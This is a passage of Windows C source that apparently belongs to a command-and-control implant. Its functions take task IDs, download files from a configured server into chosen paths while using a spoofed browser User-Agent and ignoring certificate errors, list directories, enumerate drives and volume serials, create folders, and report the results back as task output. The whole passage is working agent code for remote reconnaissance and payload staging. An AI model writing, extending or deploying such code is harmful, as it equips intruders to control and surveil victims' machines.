    HINTERNET hInternet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64)", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        fclose(fp);
        sendResult(taskID, "[-] InternetOpen Failed");
        return;
    }

    // 3. 解析 URL 组件 (沿用 httpRequest 的逻辑)
    char hostname[256] = {0};
    char path[512] = {0};
    int port = INTERNET_DEFAULT_HTTP_PORT;
    DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE;

#ifdef USE_SSL
    port = INTERNET_DEFAULT_HTTPS_PORT;
    flags |= INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
#endif

    // 此时 SERVER_URL 可能是 "http://127.0.0.1:8080"
    // 我们需要构建下载路径: /api/files/downloads/<filename>
    const char* urlHostStart = strstr(SERVER_URL, "://");
    if (urlHostStart) {
        urlHostStart += 3;
        const char* colon = strchr(urlHostStart, ':');
        if (colon) {
            strncpy(hostname, urlHostStart, colon - urlHostStart);
            port = atoi(colon + 1);
        } else {
            strcpy(hostname, urlHostStart);
        }
    } else {
        strcpy(hostname, SERVER_IP); // Fallback
    }

    // 构建请求路径
    sprintf(path, "/api/files/downloads/%s", serverFile);

    DBG_PRINT("Connect: %s:%d %s", hostname, port, path);

    // 4. 建立连接
    HINTERNET hConnect = InternetConnectA(hInternet, hostname, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        fclose(fp);
        sendResult(taskID, "[-] InternetConnect Failed");
        return;
    }

    HINTERNET hRequest = HttpOpenRequestA(hConnect, "GET", path, NULL, NULL, NULL, flags, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        fclose(fp);
        sendResult(taskID, "[-] HttpOpenRequest Failed");
        return;
    }

#ifdef USE_SSL
    DWORD dwFlags;
    DWORD dwBuffLen = sizeof(dwFlags);
    if (InternetQueryOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, (LPVOID)&dwFlags, &dwBuffLen)) {
        dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
    }
#endif

    // 5. 发送请求
    if (!HttpSendRequestA(hRequest, NULL, 0, NULL, 0)) {
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        fclose(fp);
        sendResult(taskID, "[-] HttpSendRequest Failed (File not found on server?)");
        return;
    }

    // 6. 读取数据流并写入文件 (二进制安全)
    DWORD bytesRead = 0;
    DWORD totalBytes = 0;
    char buffer[4096]; // 4KB 缓冲区

    while (InternetReadFile(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        fwrite(buffer, 1, bytesRead, fp);
        totalBytes += bytesRead;
    }

    // 7. 清理
    fclose(fp);
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    // 8. 发送成功消息
    char result[512];
    if (totalBytes > 0) {
        sprintf(result, "[+] Success: Downloaded %lu bytes to %s", totalBytes, targetPath);
    } else {
        sprintf(result, "[-] Warning: Downloaded 0 bytes (File empty or not found)");
    }
    sendResult(taskID, result);
}

// List Directory
void listDirectory(const char* path, char* output, int maxLen) {
    WIN32_FIND_DATAW findData; HANDLE hFind; int offset = 0;
    char searchPath[MAX_PATH]; WCHAR wSearchPath[MAX_PATH];
    if (strlen(path) == 0 || strcmp(path, ".") == 0) { GetCurrentDirectoryA(MAX_PATH, searchPath); sprintf(searchPath + strlen(searchPath), "\\*"); }
    else if (path[strlen(path) - 1] == '\\' || path[strlen(path) - 1] == '/') sprintf(searchPath, "%s*", path);
    else { DWORD attrs = GetFileAttributesA(path); if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY)) sprintf(searchPath, "%s\\*", path); else sprintf(searchPath, "%s", path); }
    MultiByteToWideChar(CP_UTF8, 0, searchPath, -1, wSearchPath, MAX_PATH);
    char currentDir[MAX_PATH]; if (strlen(path) == 0 || strcmp(path, ".") == 0) GetCurrentDirectoryA(MAX_PATH, currentDir); else strcpy(currentDir, path);
    WCHAR volumeName[MAX_PATH]; DWORD volumeSerial; WCHAR rootPath[4] = L"C:\\"; if (strlen(currentDir) >= 2 && currentDir[1] == ':') rootPath[0] = currentDir[0];
    GetVolumeInformationW(rootPath, volumeName, MAX_PATH, &volumeSerial, NULL, NULL, NULL, MAX_PATH);
    char volumeNameUtf8[MAX_PATH]; WideCharToMultiByte(CP_UTF8, 0, volumeName, -1, volumeNameUtf8, MAX_PATH, NULL, NULL);
    offset += sprintf(output + offset, "\n Directory of %s\n Volume: %s (Serial: %04X-%04X)\n\n", currentDir, volumeNameUtf8[0] ? volumeNameUtf8 : "No Label", (volumeSerial >> 16) & 0xFFFF, volumeSerial & 0xFFFF);
    hFind = FindFirstFileW(wSearchPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE) { sprintf(output, "[-] Failed to access: %s\n", path); return; }
    int fileCount = 0, dirCount = 0; ULONGLONG totalSize = 0;
    do {
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (offset + 256 >= maxLen) break;
            char fileName[MAX_PATH]; WideCharToMultiByte(CP_UTF8, 0, findData.cFileName, -1, fileName, MAX_PATH, NULL, NULL);
            SYSTEMTIME st; FileTimeToSystemTime(&findData.ftLastWriteTime, &st);
            offset += sprintf(output + offset, "%04d-%02d-%02d %02d:%02d    <DIR>          %s\n", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, fileName);
            dirCount++;
        }
    } while (FindNextFileW(hFind, &findData));
    FindClose(hFind); hFind = FindFirstFileW(wSearchPath, &findData);
    do {
        if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            if (offset + 256 >= maxLen) break;
            char fileName[MAX_PATH]; WideCharToMultiByte(CP_UTF8, 0, findData.cFileName, -1, fileName, MAX_PATH, NULL, NULL);
            SYSTEMTIME st; FileTimeToSystemTime(&findData.ftLastWriteTime, &st);
            ULONGLONG fileSize = ((ULONGLONG)findData.nFileSizeHigh << 32) | findData.nFileSizeLow;
            offset += sprintf(output + offset, "%04d-%02d-%02d %02d:%02d    %15llu %s\n", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, fileSize, fileName);
            fileCount++; totalSize += fileSize;
        }
    } while (FindNextFileW(hFind, &findData));
    FindClose(hFind);
    ULARGE_INTEGER freeBytes, totalBytes; WCHAR rootPathW[4]; rootPathW[0] = rootPath[0]; rootPathW[1] = L':'; rootPathW[2] = L'\\'; rootPathW[3] = L'\0';
    offset += sprintf(output + offset, "\n %15d File(s)  %15llu bytes\n %15d Dir(s)\n", fileCount, totalSize, dirCount);
    if (GetDiskFreeSpaceExW(rootPathW, NULL, &totalBytes, &freeBytes)) offset += sprintf(output + offset, " %15llu bytes free\n", freeBytes.QuadPart);
    output[offset] = '\0';
}

// List Drives
void listDrives(char* output, int maxLen) {
    int offset = 0; offset += sprintf(output + offset, "\n Available Drives:\n ================\n\n");
    DWORD drives = GetLogicalDrives();
    for (int i = 0; i < 26; i++) {
        if (drives & (1 << i)) {
            char drivePath[4]; sprintf(drivePath, "%c:\\", 'A' + i);
            UINT driveType = GetDriveTypeA(drivePath);
            const char* typeStr = "Unknown";
            switch(driveType) { case DRIVE_REMOVABLE: typeStr = "Removable"; break; case DRIVE_FIXED: typeStr = "Fixed    "; break; case DRIVE_REMOTE: typeStr = "Network  "; break; case DRIVE_CDROM: typeStr = "CD-ROM   "; break; case DRIVE_RAMDISK: typeStr = "RAM Disk "; break; }
            WCHAR volumeName[MAX_PATH] = L"", fileSystem[MAX_PATH] = L""; DWORD volumeSerial = 0;
            WCHAR drivePathW[4]; MultiByteToWideChar(CP_UTF8, 0, drivePath, -1, drivePathW, 4);
            GetVolumeInformationW(drivePathW, volumeName, MAX_PATH, &volumeSerial, NULL, NULL, fileSystem, MAX_PATH);
            char volumeNameUtf8[MAX_PATH], fileSystemUtf8[MAX_PATH];
            WideCharToMultiByte(CP_UTF8, 0, volumeName, -1, volumeNameUtf8, MAX_PATH, NULL, NULL);
            WideCharToMultiByte(CP_UTF8, 0, fileSystem, -1, fileSystemUtf8, MAX_PATH, NULL, NULL);
            ULARGE_INTEGER freeBytes, totalBytes; char spaceInfo[128] = "";
            if (GetDiskFreeSpaceExA(drivePath, &freeBytes, &totalBytes, NULL)) {
                double totalGB = (double)totalBytes.QuadPart / (1024.0 * 1024.0 * 1024.0);
                double freeGB = (double)freeBytes.QuadPart / (1024.0 * 1024.0 * 1024.0);
                sprintf(spaceInfo, "%.2f GB / %.2f GB free", freeGB, totalGB);
            }
            offset += sprintf(output + offset, " %s  [%s]  %-10s  %-20s  %s\n", drivePath, fileSystemUtf8, typeStr, volumeNameUtf8[0] ? volumeNameUtf8 : "No Label", spaceInfo);
            if (offset + 512 >= maxLen) break;
        }
    }
    offset += sprintf(output + offset, "\n"); output[offset] = '\0';
}

// Make Directory
void makeDirectory(const char* path, char* output, int maxLen) {
    if (!path || path[0] == '\0') { sprintf(output, "[-] Error: No path"); return; }
    WCHAR wPath[MAX_PATH]; MultiByteToWideChar(CP_UTF8, 0, path, -1, wPath, MAX_PATH);
    if (CreateDirectoryW(wPath, NULL)) sprintf(output, "[+] Directory created: %s", path);
    else { DWORD error = GetLastError(); if (error == ERROR_ALREADY_EXISTS) sprintf(output, "[-] Exists: %s", path); else sprintf(output, "[-] Failed: %s (Error: %d)", path, error); }
}